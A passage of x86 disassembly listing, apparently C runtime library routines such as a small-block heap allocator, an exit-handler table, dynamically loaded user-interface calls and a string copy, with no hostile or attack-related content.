  41478f:	83 c1 17             	add    $0x17,%ecx
  414792:	83 e1 f0             	and    $0xfffffff0,%ecx
  414795:	53                   	push   %ebx
  414796:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  414799:	c1 f9 04             	sar    $0x4,%ecx
  41479c:	56                   	push   %esi
  41479d:	8d 04 80             	lea    (%eax,%eax,4),%eax
  4147a0:	57                   	push   %edi
  4147a1:	49                   	dec    %ecx
  4147a2:	83 f9 20             	cmp    $0x20,%ecx
  4147a5:	8d 3c 82             	lea    (%edx,%eax,4),%edi
  4147a8:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4147ab:	7d 0b                	jge    0x4147b8
  4147ad:	83 ce ff             	or     $0xffffffff,%esi
  4147b0:	d3 ee                	shr    %cl,%esi
  4147b2:	83 4d f8 ff          	orl    $0xffffffff,-0x8(%ebp)
  4147b6:	eb 0d                	jmp    0x4147c5
  4147b8:	83 c1 e0             	add    $0xffffffe0,%ecx
  4147bb:	83 c8 ff             	or     $0xffffffff,%eax
  4147be:	33 f6                	xor    %esi,%esi
  4147c0:	d3 e8                	shr    %cl,%eax
  4147c2:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4147c5:	a1 30 73 45 00       	mov    0x457330,%eax
  4147ca:	8b d8                	mov    %eax,%ebx
  4147cc:	89 75 f4             	mov    %esi,-0xc(%ebp)
  4147cf:	3b df                	cmp    %edi,%ebx
  4147d1:	eb 14                	jmp    0x4147e7
  4147d3:	8b 4b 04             	mov    0x4(%ebx),%ecx
  4147d6:	8b 3b                	mov    (%ebx),%edi
  4147d8:	23 4d f8             	and    -0x8(%ebp),%ecx
  4147db:	23 fe                	and    %esi,%edi
  4147dd:	0b cf                	or     %edi,%ecx
  4147df:	75 0b                	jne    0x4147ec
  4147e1:	83 c3 14             	add    $0x14,%ebx
  4147e4:	3b 5d fc             	cmp    -0x4(%ebp),%ebx
  4147e7:	89 5d 08             	mov    %ebx,0x8(%ebp)
  4147ea:	72 e7                	jb     0x4147d3
  4147ec:	3b 5d fc             	cmp    -0x4(%ebp),%ebx
  4147ef:	75 24                	jne    0x414815
  4147f1:	8b da                	mov    %edx,%ebx
  4147f3:	eb 11                	jmp    0x414806
  4147f5:	8b 4b 04             	mov    0x4(%ebx),%ecx
  4147f8:	8b 3b                	mov    (%ebx),%edi
  4147fa:	23 4d f8             	and    -0x8(%ebp),%ecx
  4147fd:	23 fe                	and    %esi,%edi
  4147ff:	0b cf                	or     %edi,%ecx
  414801:	75 0a                	jne    0x41480d
  414803:	83 c3 14             	add    $0x14,%ebx
  414806:	3b d8                	cmp    %eax,%ebx
  414808:	89 5d 08             	mov    %ebx,0x8(%ebp)
  41480b:	72 e8                	jb     0x4147f5
  41480d:	3b d8                	cmp    %eax,%ebx
  41480f:	0f 84 94 00 00 00    	je     0x4148a9
  414815:	89 1d 30 73 45 00    	mov    %ebx,0x457330
  41481b:	8b 43 10             	mov    0x10(%ebx),%eax
  41481e:	8b 10                	mov    (%eax),%edx
  414820:	83 fa ff             	cmp    $0xffffffff,%edx
  414823:	89 55 fc             	mov    %edx,-0x4(%ebp)
  414826:	74 14                	je     0x41483c
  414828:	8b 8c 90 c4 00 00 00 	mov    0xc4(%eax,%edx,4),%ecx
  41482f:	8b 7c 90 44          	mov    0x44(%eax,%edx,4),%edi
  414833:	23 4d f8             	and    -0x8(%ebp),%ecx
  414836:	23 fe                	and    %esi,%edi
  414838:	0b cf                	or     %edi,%ecx
  41483a:	75 36                	jne    0x414872
  41483c:	8b 90 c4 00 00 00    	mov    0xc4(%eax),%edx
  414842:	23 55 f8             	and    -0x8(%ebp),%edx
  414845:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  414849:	8d 48 44             	lea    0x44(%eax),%ecx
  41484c:	8b 31                	mov    (%ecx),%esi
  41484e:	23 75 f4             	and    -0xc(%ebp),%esi
  414851:	0b d6                	or     %esi,%edx
  414853:	8b 75 f4             	mov    -0xc(%ebp),%esi
  414856:	75 17                	jne    0x41486f
  414858:	8b 91 84 00 00 00    	mov    0x84(%ecx),%edx
  41485e:	23 55 f8             	and    -0x8(%ebp),%edx
  414861:	ff 45 fc             	incl   -0x4(%ebp)
  414864:	83 c1 04             	add    $0x4,%ecx
  414867:	8b 39                	mov    (%ecx),%edi
  414869:	23 fe                	and    %esi,%edi
  41486b:	0b d7                	or     %edi,%edx
  41486d:	74 e9                	je     0x414858
  41486f:	8b 55 fc             	mov    -0x4(%ebp),%edx
  414872:	8b ca                	mov    %edx,%ecx
  414874:	69 c9 04 02 00 00    	imul   $0x204,%ecx,%ecx
  41487a:	8d 8c 01 44 01 00 00 	lea    0x144(%ecx,%eax,1),%ecx
  414881:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  414884:	8b 4c 90 44          	mov    0x44(%eax,%edx,4),%ecx
  414888:	33 ff                	xor    %edi,%edi
  41488a:	23 ce                	and    %esi,%ecx
  41488c:	75 6d                	jne    0x4148fb
  41488e:	8b 8c 90 c4 00 00 00 	mov    0xc4(%eax,%edx,4),%ecx
  414895:	23 4d f8             	and    -0x8(%ebp),%ecx
  414898:	6a 20                	push   $0x20
  41489a:	5f                   	pop    %edi
  41489b:	eb 5e                	jmp    0x4148fb
  41489d:	83 7b 08 00          	cmpl   $0x0,0x8(%ebx)
  4148a1:	75 0b                	jne    0x4148ae
  4148a3:	83 c3 14             	add    $0x14,%ebx
  4148a6:	89 5d 08             	mov    %ebx,0x8(%ebp)
  4148a9:	3b 5d fc             	cmp    -0x4(%ebp),%ebx
  4148ac:	72 ef                	jb     0x41489d
  4148ae:	3b 5d fc             	cmp    -0x4(%ebp),%ebx
  4148b1:	75 26                	jne    0x4148d9
  4148b3:	8b da                	mov    %edx,%ebx
  4148b5:	eb 09                	jmp    0x4148c0
  4148b7:	83 7b 08 00          	cmpl   $0x0,0x8(%ebx)
  4148bb:	75 0a                	jne    0x4148c7
  4148bd:	83 c3 14             	add    $0x14,%ebx
  4148c0:	3b d8                	cmp    %eax,%ebx
  4148c2:	89 5d 08             	mov    %ebx,0x8(%ebp)
  4148c5:	72 f0                	jb     0x4148b7
  4148c7:	3b d8                	cmp    %eax,%ebx
  4148c9:	75 0e                	jne    0x4148d9
  4148cb:	e8 0f fa ff ff       	call   0x4142df
  4148d0:	8b d8                	mov    %eax,%ebx
  4148d2:	85 db                	test   %ebx,%ebx
  4148d4:	89 5d 08             	mov    %ebx,0x8(%ebp)
  4148d7:	74 18                	je     0x4148f1
  4148d9:	53                   	push   %ebx
  4148da:	e8 b7 fa ff ff       	call   0x414396
  4148df:	59                   	pop    %ecx
  4148e0:	8b 4b 10             	mov    0x10(%ebx),%ecx
  4148e3:	89 01                	mov    %eax,(%ecx)
  4148e5:	8b 43 10             	mov    0x10(%ebx),%eax
  4148e8:	83 38 ff             	cmpl   $0xffffffff,(%eax)
  4148eb:	0f 85 24 ff ff ff    	jne    0x414815
  4148f1:	33 c0                	xor    %eax,%eax
  4148f3:	e9 7a 01 00 00       	jmp    0x414a72
  4148f8:	d1 e1                	shl    %ecx
  4148fa:	47                   	inc    %edi
  4148fb:	85 c9                	test   %ecx,%ecx
  4148fd:	7d f9                	jge    0x4148f8
  4148ff:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  414902:	8b 54 f9 04          	mov    0x4(%ecx,%edi,8),%edx
  414906:	8b 0a                	mov    (%edx),%ecx
  414908:	2b 4d f0             	sub    -0x10(%ebp),%ecx
  41490b:	8b f1                	mov    %ecx,%esi
  41490d:	c1 fe 04             	sar    $0x4,%esi
  414910:	4e                   	dec    %esi
  414911:	83 fe 3f             	cmp    $0x3f,%esi
  414914:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  414917:	7e 03                	jle    0x41491c
  414919:	6a 3f                	push   $0x3f
  41491b:	5e                   	pop    %esi
  41491c:	3b f7                	cmp    %edi,%esi
  41491e:	0f 84 01 01 00 00    	je     0x414a25
  414924:	8b 4a 04             	mov    0x4(%edx),%ecx
  414927:	3b 4a 08             	cmp    0x8(%edx),%ecx
  41492a:	75 5c                	jne    0x414988
  41492c:	83 ff 20             	cmp    $0x20,%edi
  41492f:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  414934:	7d 26                	jge    0x41495c
  414936:	8b cf                	mov    %edi,%ecx
  414938:	d3 eb                	shr    %cl,%ebx
  41493a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  41493d:	8d 7c 38 04          	lea    0x4(%eax,%edi,1),%edi
  414941:	f7 d3                	not    %ebx
  414943:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  414946:	23 5c 88 44          	and    0x44(%eax,%ecx,4),%ebx
  41494a:	89 5c 88 44          	mov    %ebx,0x44(%eax,%ecx,4)
  41494e:	fe 0f                	decb   (%edi)
  414950:	75 33                	jne    0x414985
  414952:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  414955:	8b 5d 08             	mov    0x8(%ebp),%ebx
  414958:	21 0b                	and    %ecx,(%ebx)
  41495a:	eb 2c                	jmp    0x414988
  41495c:	8d 4f e0             	lea    -0x20(%edi),%ecx
  41495f:	d3 eb                	shr    %cl,%ebx
  414961:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  414964:	8d 8c 88 c4 00 00 00 	lea    0xc4(%eax,%ecx,4),%ecx
  41496b:	8d 7c 38 04          	lea    0x4(%eax,%edi,1),%edi
  41496f:	f7 d3                	not    %ebx
  414971:	21 19                	and    %ebx,(%ecx)
  414973:	fe 0f                	decb   (%edi)
  414975:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  414978:	75 0b                	jne    0x414985
  41497a:	8b 5d 08             	mov    0x8(%ebp),%ebx
  41497d:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  414980:	21 4b 04             	and    %ecx,0x4(%ebx)
  414983:	eb 03                	jmp    0x414988
  414985:	8b 5d 08             	mov    0x8(%ebp),%ebx
  414988:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  41498c:	8b 4a 08             	mov    0x8(%edx),%ecx
  41498f:	8b 7a 04             	mov    0x4(%edx),%edi
  414992:	89 79 04             	mov    %edi,0x4(%ecx)
  414995:	8b 4a 04             	mov    0x4(%edx),%ecx
  414998:	8b 7a 08             	mov    0x8(%edx),%edi
  41499b:	89 79 08             	mov    %edi,0x8(%ecx)
  41499e:	0f 84 8d 00 00 00    	je     0x414a31
  4149a4:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4149a7:	8d 0c f1             	lea    (%ecx,%esi,8),%ecx
  4149aa:	8b 79 04             	mov    0x4(%ecx),%edi
  4149ad:	89 4a 08             	mov    %ecx,0x8(%edx)
  4149b0:	89 7a 04             	mov    %edi,0x4(%edx)
  4149b3:	89 51 04             	mov    %edx,0x4(%ecx)
  4149b6:	8b 4a 04             	mov    0x4(%edx),%ecx
  4149b9:	89 51 08             	mov    %edx,0x8(%ecx)
  4149bc:	8b 4a 04             	mov    0x4(%edx),%ecx
  4149bf:	3b 4a 08             	cmp    0x8(%edx),%ecx
  4149c2:	75 5e                	jne    0x414a22
  4149c4:	8a 4c 06 04          	mov    0x4(%esi,%eax,1),%cl
  4149c8:	88 4d 0b             	mov    %cl,0xb(%ebp)
  4149cb:	fe c1                	inc    %cl
  4149cd:	83 fe 20             	cmp    $0x20,%esi
  4149d0:	88 4c 06 04          	mov    %cl,0x4(%esi,%eax,1)
  4149d4:	7d 23                	jge    0x4149f9
  4149d6:	80 7d 0b 00          	cmpb   $0x0,0xb(%ebp)
  4149da:	75 0b                	jne    0x4149e7
  4149dc:	bf 00 00 00 80       	mov    $0x80000000,%edi
  4149e1:	8b ce                	mov    %esi,%ecx
  4149e3:	d3 ef                	shr    %cl,%edi
  4149e5:	09 3b                	or     %edi,(%ebx)
  4149e7:	8b ce                	mov    %esi,%ecx
  4149e9:	bf 00 00 00 80       	mov    $0x80000000,%edi
  4149ee:	d3 ef                	shr    %cl,%edi
  4149f0:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4149f3:	09 7c 88 44          	or     %edi,0x44(%eax,%ecx,4)
  4149f7:	eb 29                	jmp    0x414a22
  4149f9:	80 7d 0b 00          	cmpb   $0x0,0xb(%ebp)
  4149fd:	75 0d                	jne    0x414a0c
  4149ff:	8d 4e e0             	lea    -0x20(%esi),%ecx
  414a02:	bf 00 00 00 80       	mov    $0x80000000,%edi
  414a07:	d3 ef                	shr    %cl,%edi
  414a09:	09 7b 04             	or     %edi,0x4(%ebx)
  414a0c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  414a0f:	8d bc 88 c4 00 00 00 	lea    0xc4(%eax,%ecx,4),%edi
  414a16:	8d 4e e0             	lea    -0x20(%esi),%ecx
  414a19:	be 00 00 00 80       	mov    $0x80000000,%esi
  414a1e:	d3 ee                	shr    %cl,%esi
  414a20:	09 37                	or     %esi,(%edi)
  414a22:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  414a25:	85 c9                	test   %ecx,%ecx
  414a27:	74 0b                	je     0x414a34
  414a29:	89 0a                	mov    %ecx,(%edx)
  414a2b:	89 4c 11 fc          	mov    %ecx,-0x4(%ecx,%edx,1)
  414a2f:	eb 03                	jmp    0x414a34
  414a31:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  414a34:	8b 75 f0             	mov    -0x10(%ebp),%esi
  414a37:	03 d1                	add    %ecx,%edx
  414a39:	8d 4e 01             	lea    0x1(%esi),%ecx
  414a3c:	89 0a                	mov    %ecx,(%edx)
  414a3e:	89 4c 32 fc          	mov    %ecx,-0x4(%edx,%esi,1)
  414a42:	8b 75 f4             	mov    -0xc(%ebp),%esi
  414a45:	8b 0e                	mov    (%esi),%ecx
  414a47:	85 c9                	test   %ecx,%ecx
  414a49:	8d 79 01             	lea    0x1(%ecx),%edi
  414a4c:	89 3e                	mov    %edi,(%esi)
  414a4e:	75 1a                	jne    0x414a6a
  414a50:	3b 1d 20 73 45 00    	cmp    0x457320,%ebx
  414a56:	75 12                	jne    0x414a6a
  414a58:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  414a5b:	3b 0d 38 73 45 00    	cmp    0x457338,%ecx
  414a61:	75 07                	jne    0x414a6a
  414a63:	83 25 20 73 45 00 00 	andl   $0x0,0x457320
  414a6a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  414a6d:	89 08                	mov    %ecx,(%eax)
  414a6f:	8d 42 04             	lea    0x4(%edx),%eax
  414a72:	5f                   	pop    %edi
  414a73:	5e                   	pop    %esi
  414a74:	5b                   	pop    %ebx
  414a75:	c9                   	leave
  414a76:	c3                   	ret
  414a77:	a1 38 6f 45 00       	mov    0x456f38,%eax
  414a7c:	85 c0                	test   %eax,%eax
  414a7e:	74 0f                	je     0x414a8f
  414a80:	ff 74 24 04          	push   0x4(%esp)
  414a84:	ff d0                	call   *%eax
  414a86:	85 c0                	test   %eax,%eax
  414a88:	59                   	pop    %ecx
  414a89:	74 04                	je     0x414a8f
  414a8b:	33 c0                	xor    %eax,%eax
  414a8d:	40                   	inc    %eax
  414a8e:	c3                   	ret
  414a8f:	33 c0                	xor    %eax,%eax
  414a91:	c3                   	ret
  414a92:	56                   	push   %esi
  414a93:	ff 35 68 74 45 00    	push   0x457468
  414a99:	e8 93 1f 00 00       	call   0x416a31
  414a9e:	59                   	pop    %ecx
  414a9f:	8b 0d 64 74 45 00    	mov    0x457464,%ecx
  414aa5:	8b f0                	mov    %eax,%esi
  414aa7:	a1 68 74 45 00       	mov    0x457468,%eax
  414aac:	8b d1                	mov    %ecx,%edx
  414aae:	2b d0                	sub    %eax,%edx
  414ab0:	83 c2 04             	add    $0x4,%edx
  414ab3:	3b f2                	cmp    %edx,%esi
  414ab5:	73 4e                	jae    0x414b05
  414ab7:	b9 00 08 00 00       	mov    $0x800,%ecx
  414abc:	3b f1                	cmp    %ecx,%esi
  414abe:	73 02                	jae    0x414ac2
  414ac0:	8b ce                	mov    %esi,%ecx
  414ac2:	03 ce                	add    %esi,%ecx
  414ac4:	51                   	push   %ecx
  414ac5:	50                   	push   %eax
  414ac6:	e8 b9 1d 00 00       	call   0x416884
  414acb:	85 c0                	test   %eax,%eax
  414acd:	59                   	pop    %ecx
  414ace:	59                   	pop    %ecx
  414acf:	75 17                	jne    0x414ae8
  414ad1:	83 c6 10             	add    $0x10,%esi
  414ad4:	56                   	push   %esi
  414ad5:	ff 35 68 74 45 00    	push   0x457468
  414adb:	e8 a4 1d 00 00       	call   0x416884
  414ae0:	85 c0                	test   %eax,%eax
  414ae2:	59                   	pop    %ecx
  414ae3:	59                   	pop    %ecx
  414ae4:	75 02                	jne    0x414ae8
  414ae6:	5e                   	pop    %esi
  414ae7:	c3                   	ret
  414ae8:	8b 0d 64 74 45 00    	mov    0x457464,%ecx
  414aee:	2b 0d 68 74 45 00    	sub    0x457468,%ecx
  414af4:	a3 68 74 45 00       	mov    %eax,0x457468
  414af9:	c1 f9 02             	sar    $0x2,%ecx
  414afc:	8d 0c 88             	lea    (%eax,%ecx,4),%ecx
  414aff:	89 0d 64 74 45 00    	mov    %ecx,0x457464
  414b05:	89 39                	mov    %edi,(%ecx)
  414b07:	83 05 64 74 45 00 04 	addl   $0x4,0x457464
  414b0e:	8b c7                	mov    %edi,%eax
  414b10:	5e                   	pop    %esi
  414b11:	c3                   	ret
  414b12:	68 80 00 00 00       	push   $0x80
  414b17:	e8 c6 d7 ff ff       	call   0x4122e2
  414b1c:	85 c0                	test   %eax,%eax
  414b1e:	59                   	pop    %ecx
  414b1f:	a3 68 74 45 00       	mov    %eax,0x457468
  414b24:	75 04                	jne    0x414b2a
  414b26:	6a 18                	push   $0x18
  414b28:	58                   	pop    %eax
  414b29:	c3                   	ret
  414b2a:	83 20 00             	andl   $0x0,(%eax)
  414b2d:	a1 68 74 45 00       	mov    0x457468,%eax
  414b32:	a3 64 74 45 00       	mov    %eax,0x457464
  414b37:	33 c0                	xor    %eax,%eax
  414b39:	c3                   	ret
  414b3a:	6a 0c                	push   $0xc
  414b3c:	68 b0 85 41 00       	push   $0x4185b0
  414b41:	e8 ce e4 ff ff       	call   0x413014
  414b46:	e8 d9 d7 ff ff       	call   0x412324
  414b4b:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  414b4f:	8b 7d 08             	mov    0x8(%ebp),%edi
  414b52:	e8 3b ff ff ff       	call   0x414a92
  414b57:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  414b5a:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  414b5e:	e8 09 00 00 00       	call   0x414b6c
  414b63:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  414b66:	e8 e4 e4 ff ff       	call   0x41304f
  414b6b:	c3                   	ret
  414b6c:	e8 bc d7 ff ff       	call   0x41232d
  414b71:	c3                   	ret
  414b72:	ff 74 24 04          	push   0x4(%esp)
  414b76:	e8 bf ff ff ff       	call   0x414b3a
  414b7b:	f7 d8                	neg    %eax
  414b7d:	1b c0                	sbb    %eax,%eax
  414b7f:	f7 d8                	neg    %eax
  414b81:	59                   	pop    %ecx
  414b82:	48                   	dec    %eax
  414b83:	c3                   	ret
  414b84:	55                   	push   %ebp
  414b85:	8b ec                	mov    %esp,%ebp
  414b87:	83 ec 10             	sub    $0x10,%esp
  414b8a:	53                   	push   %ebx
  414b8b:	33 db                	xor    %ebx,%ebx
  414b8d:	39 1d 40 6f 45 00    	cmp    %ebx,0x456f40
  414b93:	56                   	push   %esi
  414b94:	57                   	push   %edi
  414b95:	75 6d                	jne    0x414c04
  414b97:	68 20 86 41 00       	push   $0x418620
  414b9c:	ff 15 f4 80 41 00    	call   *0x4180f4
  414ba2:	8b f8                	mov    %eax,%edi
  414ba4:	3b fb                	cmp    %ebx,%edi
  414ba6:	0f 84 93 00 00 00    	je     0x414c3f
  414bac:	8b 35 08 80 41 00    	mov    0x418008,%esi
  414bb2:	68 14 86 41 00       	push   $0x418614
  414bb7:	57                   	push   %edi
  414bb8:	ff d6                	call   *%esi
  414bba:	85 c0                	test   %eax,%eax
  414bbc:	a3 40 6f 45 00       	mov    %eax,0x456f40
  414bc1:	74 7c                	je     0x414c3f
  414bc3:	68 04 86 41 00       	push   $0x418604
  414bc8:	57                   	push   %edi
  414bc9:	ff d6                	call   *%esi
  414bcb:	68 f0 85 41 00       	push   $0x4185f0
  414bd0:	57                   	push   %edi
  414bd1:	a3 44 6f 45 00       	mov    %eax,0x456f44
  414bd6:	ff d6                	call   *%esi
  414bd8:	83 3d 8c 6c 45 00 02 	cmpl   $0x2,0x456c8c
  414bdf:	a3 48 6f 45 00       	mov    %eax,0x456f48
  414be4:	75 1e                	jne    0x414c04
  414be6:	68 d4 85 41 00       	push   $0x4185d4
  414beb:	57                   	push   %edi
  414bec:	ff d6                	call   *%esi
  414bee:	85 c0                	test   %eax,%eax
  414bf0:	a3 50 6f 45 00       	mov    %eax,0x456f50
  414bf5:	74 0d                	je     0x414c04
  414bf7:	68 bc 85 41 00       	push   $0x4185bc
  414bfc:	57                   	push   %edi
  414bfd:	ff d6                	call   *%esi
  414bff:	a3 4c 6f 45 00       	mov    %eax,0x456f4c
  414c04:	a1 4c 6f 45 00       	mov    0x456f4c,%eax
  414c09:	85 c0                	test   %eax,%eax
  414c0b:	74 3c                	je     0x414c49
  414c0d:	ff d0                	call   *%eax
  414c0f:	85 c0                	test   %eax,%eax
  414c11:	74 1d                	je     0x414c30
  414c13:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  414c16:	51                   	push   %ecx
  414c17:	6a 0c                	push   $0xc
  414c19:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  414c1c:	51                   	push   %ecx
  414c1d:	6a 01                	push   $0x1
  414c1f:	50                   	push   %eax
  414c20:	ff 15 50 6f 45 00    	call   *0x456f50
  414c26:	85 c0                	test   %eax,%eax
  414c28:	74 06                	je     0x414c30
  414c2a:	f6 45 f8 01          	testb  $0x1,-0x8(%ebp)
  414c2e:	75 19                	jne    0x414c49
  414c30:	83 3d 98 6c 45 00 04 	cmpl   $0x4,0x456c98
  414c37:	72 0a                	jb     0x414c43
  414c39:	80 4d 12 20          	orb    $0x20,0x12(%ebp)
  414c3d:	eb 29                	jmp    0x414c68
  414c3f:	33 c0                	xor    %eax,%eax
  414c41:	eb 35                	jmp    0x414c78
  414c43:	80 4d 12 04          	orb    $0x4,0x12(%ebp)
  414c47:	eb 1f                	jmp    0x414c68
  414c49:	a1 44 6f 45 00       	mov    0x456f44,%eax
  414c4e:	85 c0                	test   %eax,%eax
  414c50:	74 16                	je     0x414c68
  414c52:	ff d0                	call   *%eax
  414c54:	8b d8                	mov    %eax,%ebx
  414c56:	85 db                	test   %ebx,%ebx
  414c58:	74 0e                	je     0x414c68
  414c5a:	a1 48 6f 45 00       	mov    0x456f48,%eax
  414c5f:	85 c0                	test   %eax,%eax
  414c61:	74 05                	je     0x414c68
  414c63:	53                   	push   %ebx
  414c64:	ff d0                	call   *%eax
  414c66:	8b d8                	mov    %eax,%ebx
  414c68:	ff 75 10             	push   0x10(%ebp)
  414c6b:	ff 75 0c             	push   0xc(%ebp)
  414c6e:	ff 75 08             	push   0x8(%ebp)
  414c71:	53                   	push   %ebx
  414c72:	ff 15 40 6f 45 00    	call   *0x456f40
  414c78:	5f                   	pop    %edi
  414c79:	5e                   	pop    %esi
  414c7a:	5b                   	pop    %ebx
  414c7b:	c9                   	leave
  414c7c:	c3                   	ret
  414c7d:	cc                   	int3
  414c7e:	cc                   	int3
  414c7f:	cc                   	int3
  414c80:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  414c84:	57                   	push   %edi
  414c85:	85 c9                	test   %ecx,%ecx
  414c87:	0f 84 92 00 00 00    	je     0x414d1f
  414c8d:	56                   	push   %esi
  414c8e:	53                   	push   %ebx
  414c8f:	8b d9                	mov    %ecx,%ebx
  414c91:	8b 74 24 14          	mov    0x14(%esp),%esi
  414c95:	f7 c6 03 00 00 00    	test   $0x3,%esi
  414c9b:	8b 7c 24 10          	mov    0x10(%esp),%edi
  414c9f:	75 0b                	jne    0x414cac
  414ca1:	c1 e9 02             	shr    $0x2,%ecx
  414ca4:	0f 85 85 00 00 00    	jne    0x414d2f
  414caa:	eb 27                	jmp    0x414cd3
  414cac:	8a 06                	mov    (%esi),%al
  414cae:	83 c6 01             	add    $0x1,%esi
  414cb1:	88 07                	mov    %al,(%edi)
  414cb3:	83 c7 01             	add    $0x1,%edi
  414cb6:	83 e9 01             	sub    $0x1,%ecx
  414cb9:	74 2b                	je     0x414ce6
  414cbb:	84 c0                	test   %al,%al
  414cbd:	74 2f                	je     0x414cee
  414cbf:	f7 c6 03 00 00 00    	test   $0x3,%esi
  414cc5:	75 e5                	jne    0x414cac
  414cc7:	8b d9                	mov    %ecx,%ebx
  414cc9:	c1 e9 02             	shr    $0x2,%ecx
  414ccc:	75 61                	jne    0x414d2f
  414cce:	83 e3 03             	and    $0x3,%ebx
  414cd1:	74 13                	je     0x414ce6
  414cd3:	8a 06                	mov    (%esi),%al
  414cd5:	83 c6 01             	add    $0x1,%esi
  414cd8:	88 07                	mov    %al,(%edi)
  414cda:	83 c7 01             	add    $0x1,%edi
  414cdd:	84 c0                	test   %al,%al
  414cdf:	74 37                	je     0x414d18
  414ce1:	83 eb 01             	sub    $0x1,%ebx
  414ce4:	75 ed                	jne    0x414cd3
  414ce6:	8b 44 24 10          	mov    0x10(%esp),%eax
  414cea:	5b                   	pop    %ebx
  414ceb:	5e                   	pop    %esi
  414cec:	5f                   	pop    %edi
  414ced:	c3                   	ret
  414cee:	f7 c7 03 00 00 00    	test   $0x3,%edi
  414cf4:	74 16                	je     0x414d0c
  414cf6:	88 07                	mov    %al,(%edi)
  414cf8:	83 c7 01             	add    $0x1,%edi
  414cfb:	83 e9 01             	sub    $0x1,%ecx
  414cfe:	0f 84 98 00 00 00    	je     0x414d9c
  414d04:	f7 c7 03 00 00 00    	test   $0x3,%edi
  414d0a:	75 ea                	jne    0x414cf6
  414d0c:	8b d9                	mov    %ecx,%ebx
  414d0e:	c1 e9 02             	shr    $0x2,%ecx
  414d11:	75 74                	jne    0x414d87
  414d13:	88 07                	mov    %al,(%edi)
  414d15:	83 c7 01             	add    $0x1,%edi
  414d18:	83 eb 01             	sub    $0x1,%ebx
  414d1b:	75 f6                	jne    0x414d13
  414d1d:	5b                   	pop    %ebx
  414d1e:	5e                   	pop    %esi
  414d1f:	8b 44 24 08          	mov    0x8(%esp),%eax
  414d23:	5f                   	pop    %edi
  414d24:	c3                   	ret
  414d25:	89 17                	mov    %edx,(%edi)
  414d27:	83 c7 04             	add    $0x4,%edi
  414d2a:	83 e9 01             	sub    $0x1,%ecx
  414d2d:	74 9f                	je     0x414cce
  414d2f:	ba ff fe fe 7e       	mov    $0x7efefeff,%edx
  414d34:	8b 06                	mov    (%esi),%eax
  414d36:	03 d0                	add    %eax,%edx
  414d38:	83 f0 ff             	xor    $0xffffffff,%eax
  414d3b:	33 c2                	xor    %edx,%eax
  414d3d:	8b 16                	mov    (%esi),%edx
  414d3f:	83 c6 04             	add    $0x4,%esi
  414d42:	a9 00 01 01 81       	test   $0x81010100,%eax
  414d47:	74 dc                	je     0x414d25
  414d49:	84 d2                	test   %dl,%dl
  414d4b:	74 2c                	je     0x414d79
  414d4d:	84 f6                	test   %dh,%dh
  414d4f:	74 1e                	je     0x414d6f
  414d51:	f7 c2 00 00 ff 00    	test   $0xff0000,%edx
  414d57:	74 0c                	je     0x414d65
  414d59:	f7 c2 00 00 00 ff    	test   $0xff000000,%edx
  414d5f:	75 c4                	jne    0x414d25
  414d61:	89 17                	mov    %edx,(%edi)
  414d63:	eb 18                	jmp    0x414d7d
  414d65:	81 e2 ff ff 00 00    	and    $0xffff,%edx
  414d6b:	89 17                	mov    %edx,(%edi)
  414d6d:	eb 0e                	jmp    0x414d7d
  414d6f:	81 e2 ff 00 00 00    	and    $0xff,%edx
  414d75:	89 17                	mov    %edx,(%edi)
  414d77:	eb 04                	jmp    0x414d7d
  414d79:	33 d2                	xor    %edx,%edx
  414d7b:	89 17                	mov    %edx,(%edi)
  414d7d:	83 c7 04             	add    $0x4,%edi
  414d80:	33 c0                	xor    %eax,%eax
  414d82:	83 e9 01             	sub    $0x1,%ecx
  414d85:	74 0c                	je     0x414d93
  414d87:	33 c0                	xor    %eax,%eax
  414d89:	89 07                	mov    %eax,(%edi)
  414d8b:	83 c7 04             	add    $0x4,%edi
  414d8e:	83 e9 01             	sub    $0x1,%ecx
  414d91:	75 f6                	jne    0x414d89
  414d93:	83 e3 03             	and    $0x3,%ebx
  414d96:	0f 85 77 ff ff ff    	jne    0x414d13
  414d9c:	8b 44 24 10          	mov    0x10(%esp),%eax
  414da0:	5b                   	pop    %ebx
  414da1:	5e                   	pop    %esi
  414da2:	5f                   	pop    %edi
  414da3:	c3                   	ret
  414da4:	0f b6 44 24 04       	movzbl 0x4(%esp),%eax
  414da9:	8a 4c 24 0c          	mov    0xc(%esp),%cl
  414dad:	84 88 01 71 45 00    	test   %cl,0x457101(%eax)
  414db3:	75 1c                	jne    0x414dd1
  414db5:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  414dba:	74 0e                	je     0x414dca
  414dbc:	0f b7 04 45 42 8a 41 	movzwl 0x418a42(,%eax,2),%eax
  414dc3:	00 
  414dc4:	23 44 24 08          	and    0x8(%esp),%eax
  414dc8:	eb 02                	jmp    0x414dcc
  414dca:	33 c0                	xor    %eax,%eax
  414dcc:	85 c0                	test   %eax,%eax
  414dce:	75 01                	jne    0x414dd1
  414dd0:	c3                   	ret
  414dd1:	33 c0                	xor    %eax,%eax
  414dd3:	40                   	inc    %eax
  414dd4:	c3                   	ret
  414dd5:	6a 04                	push   $0x4
